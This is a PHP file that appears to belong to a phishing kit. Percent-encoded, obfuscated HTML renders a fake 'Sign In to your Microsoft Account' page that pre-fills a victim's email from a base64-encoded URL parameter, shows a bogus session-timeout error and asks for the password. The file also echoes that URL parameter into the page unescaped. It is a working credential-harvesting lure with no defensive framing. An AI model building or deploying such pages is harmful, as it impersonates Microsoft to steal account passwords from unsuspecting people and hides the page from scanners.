<?php
require_once 'hostname.php';

$mail = $_GET['ref'];

 
function doEncrypt($mail)
{
	$rand = substr(md5(microtime()),rand(0,26),2);
	$crystr = "".$rand."".base64_encode($mail)."";
	return $crystr;
}

function doDecrypt($mail)
{
	$str = substr($mail, 2);
	$crystr = base64_decode($str);
	return $crystr;
}

?>
<script type="text/javascript">
document.write(unescape('%3c%68%74%6d%6c%3e%0d%0a%20%20%20%20%3c%68%65%61%64%3e%0d%0a%20%20%20%20%20%20%20%20%3c%74%69%74%6c%65%3e%53%69%67%6e%20%49%6e%20%74%6f%20%79%6f%75%72%20%4d%69%63%72%6f%73%6f%66%74%20%41%63%63%6f%75%6e%74%3c%2f%74%69%74%6c%65%3e%0d%0a%20%20%20%20%20%20%20%20%3c%6c%69%6e%6b%20%72%65%6c%3d%22%69%63%6f%6e%22%20%74%79%70%65%3d%22%69%6d%61%67%65%2f%78%2d%69%63%6f%6e%22%20%68%72%65%66%3d%22%6f%66%66%69%63%6f%6e%2e%70%6e%67%22%3e%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3c%6d%65%74%61%20%63%68%61%72%73%65%74%3d%22%75%74%66%2d%38%22%3e%20%3c%6d%65%74%61%20%6e%61%6d%65%3d%22%76%69%65%77%70%6f%72%74%22%20%63%6f%6e%74%65%6e%74%3d%22%77%69%64%74%68%3d%64%65%76%69%63%65%2d%77%69%64%74%68%2c%20%69%6e%69%74%69%61%6c%2d%73%63%61%6c%65%3d%31%22%3e%0d%0a%20%20%20%20%3c%6c%69%6e%6b%20%72%65%6c%3d%22%73%74%79%6c%65%73%68%65%65%74%22%20%68%72%65%66%3d%22%68%74%74%70%73%3a%2f%2f%6d%61%78%63%64%6e%2e%62%6f%6f%74%73%74%72%61%70%63%64%6e%2e%63%6f%6d%2f%62%6f%6f%74%73%74%72%61%70%2f%34%2e%31%2e%33%2f%63%73%73%2f%62%6f%6f%74%73%74%72%61%70%2e%6d%69%6e%2e%63%73%73%22%3e%0d%0a%20%20%20%20%3c%73%63%72%69%70%74%20%73%72%63%3d%22%68%74%74%70%73%3a%2f%2f%61%6a%61%78%2e%67%6f%6f%67%6c%65%61%70%69%73%2e%63%6f%6d%2f%61%6a%61%78%2f%6c%69%62%73%2f%6a%71%75%65%72%79%2f%33%2e%35%2e%31%2f%6a%71%75%65%72%79%2e%6d%69%6e%2e%6a%73%22%3e%3c%2f%73%63%72%69%70%74%3e%0d%0a%20%20%20%20%3c%6c%69%6e%6b%20%72%65%6c%3d%22%73%74%79%6c%65%73%68%65%65%74%22%20%74%79%70%65%3d%22%74%65%78%74%2f%63%73%73%22%20%68%72%65%66%3d%22%73%74%79%6c%65%2e%63%73%73%22%3e%0d%0a%20%20%20%20%3c%73%63%72%69%70%74%20%73%72%63%3d%22%73%63%72%69%70%74%2e%6a%73%22%3e%3c%2f%73%63%72%69%70%74%3e%20%20%20%0d%0a%0d%0a%20%20%20%20%20%20%20%0d%0a%3c%2f%68%65%61%64%3e%0d%0a%20%20%20%20%3c%62%6f%64%79%20%63%6c%61%73%73%3d%22%66%6f%72%6d%62%6f%64%22%3e%0d%0a%20%20%20%20%20%20%20%20%3c%66%6f%72%6d%3e%20%20%20%20%20%20%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%3c%64%69%76%20%63%6c%61%73%73%3d%22%62%6f%78%69%6e%67%22%20%69%64%3d%22%62%6f%78%69%6e%67%22%20%3e%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%3c%69%6d%67%20%69%64%3d%22%6c%6f%67%6f%22%20%73%72%63%3d%22%6f%66%66%6c%6f%67%6f%2e%70%6e%67%22%3e%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3c%64%69%76%20%3e%20%20%0d%0a%09%09%09%3c%61%20%68%72%65%66%3d%22%23%22%3e%20%3c%69%6d%67%20%69%64%3d%22%6f%66%66%62%61%63%6b%62%74%6e%22%20%73%72%63%3d%22%6f%66%66%2d%62%61%63%6b%69%63%6f%6e%2e%70%6e%67%22%3e%3c%2f%61%3e%20%20%20%20%20%20%20%20%20%0d%0a%20%20%20%20%20%20%20%20%20%20%3c%69%6e%70%75%74%20%74%79%70%65%3d%22%65%6d%61%69%6c%22%20%6e%61%6d%65%3d%22%65%6d%61%69%6c%22%20%69%64%3d%22%65%6d%61%69%6c%22%20%76%61%6c%75%65%3d%22<?php echo doDecrypt($mail); ?>%22%20%20%70%6c%61%63%65%68%6f%6c%64%65%72%3d%22%22%20%72%65%61%64%6f%6e%6c%79%20%73%69%7a%65%3d%22%33%35%22%20%3e%0d%0a%20%20%20%20%20%20%20%20%3c%64%69%76%20%63%6c%61%73%73%3d%22%66%6f%72%6d%2d%6f%75%74%6c%69%6e%65%22%3e%0d%0a%20%20%20%20%20%20%20%20%3c%68%34%20%63%6c%61%73%73%3d%22%65%6e%74%70%61%73%73%22%3e%45%6e%74%65%72%20%70%61%73%73%77%6f%72%64%3c%2f%68%34%3e%0d%0a%20%20%20%20%20%20%20%20%3c%73%70%61%6e%20%69%64%3d%22%65%72%72%6f%72%22%3e%53%6f%72%72%79%2c%20%79%6f%75%72%20%73%69%67%6e%2d%69%6e%20%74%69%6d%65%64%20%6f%75%74%2e%20%50%6c%65%61%73%65%20%73%69%67%6e%20%69%6e%20%61%67%61%69%6e%2e%3c%2f%73%70%61%6e%3e%0d%0a%20%20%20%20%20%20%20%20%20%20%20%3c%64%69%76%20%63%6c%61%73%73%3d%22%66%6f%72%6d%2d%67%72%6f%75%70%22%3e%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%3c%69%6e%70%75%74%20%6e%61%6d%65%3d%22%70%61%73%73%22%20%69%64%3d%22%70%61%73%73%22%20%76%61%6c%75%65%3d%22%22%20%74%79%70%65%3d%22%70%61%73%73%77%6f%72%64%22%20%72%65%71%75%69%72%65%64%20%61%75%74%6f%63%6f%6d%70%6c%65%74%65%3d%22%6f%66%66%22%20%72%65%61%64%6f%6e%6c%79%20%6f%6e%66%6f%63%75%73%3d%22%74%68%69%73%2e%72%65%6d%6f%76%65%41%74%74%72%69%62%75%74%65%28%27%72%65%61%64%6f%6e%6c%79%27%29%3b%22%20%70%6c%61%63%65%68%6f%6c%64%65%72%3d%22%50%61%73%73%77%6f%72%64%22%20%61%75%74%6f%66%6f%63%75%73%3d%22%61%75%74%6f%66%6f%63%75%73%22%3e%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%3c%70%3e%3c%61%20%68%72%65%66%3d%22%23%22%3e%46%6f%72%67%6f%74%20%70%61%73%73%77%6f%72%64%3f%3c%2f%61%3e%3c%2f%70%3e%3c%2f%64%69%76%3e%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%3c%64%69%76%20%63%6c%61%73%73%3d%22%66%6f%72%6d%2d%67%72%6f%75%70%22%3e%0d%0a%20%20%20%20%20%20%20%20%3c%62%75%74%74%6f%6e%20%74%79%70%65%3d%22%73%75%62%6d%69%74%22%20%63%6c%61%73%73%3d%22%62%74%6e%20%66%6c%6f%61%74%2d%72%69%67%68%74%22%20%73%74%79%6c%65%3d%22%20%66%6f%6e%74%2d%73%69%7a%65%3a%31%34%2e%35%70%78%3b%22%3e%53%69%67%6e%20%49%6e%3c%2f%62%75%74%74%6f%6e%3e%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%3c%2f%64%69%76%3e%0d%0a%20%20%20%20%20%20%20%20%3c%2f%64%69%76%3e%0d%0a%3c%2f%64%69%76%3e%0d%0a%20%20%20%20%3c%2f%64%69%76%3e%0d%0a%20%20%20%20%3c%64%69%76%20%63%6c%61%73%73%3d%22%66%6f%6f%74%65%72%22%3e%20%0d%0a%20%20%20%20%20%20%20%20%3c%70%3e%2e%20%2e%20%2e%3c%2f%70%3e%0d%0a%20%20%20%20%20%20%20%20%3c%70%3e%50%72%69%76%61%63%79%20%26%20%63%6f%6f%6b%69%65%73%3c%2f%70%3e%0d%0a%20%20%20%20%20%20%20%20%3c%70%3e%54%65%72%6d%73%20%6f%66%20%75%73%65%3c%2f%70%3e%0d%0a%20%20%20%20%3c%2f%64%69%76%3e%20%20%20%20%20%20%20%0d%0a%20%20%20%20%0d%0a%20%20%20%20%20%20%20%20%3c%2f%66%6f%72%6d%3e%0d%0a%20%20%20%20%20%20%20%20%0d%0a%20%20%20%20%3c%2f%62%6f%64%79%3e%0d%0a%3c%2f%68%74%6d%6c%3e'));
</script>

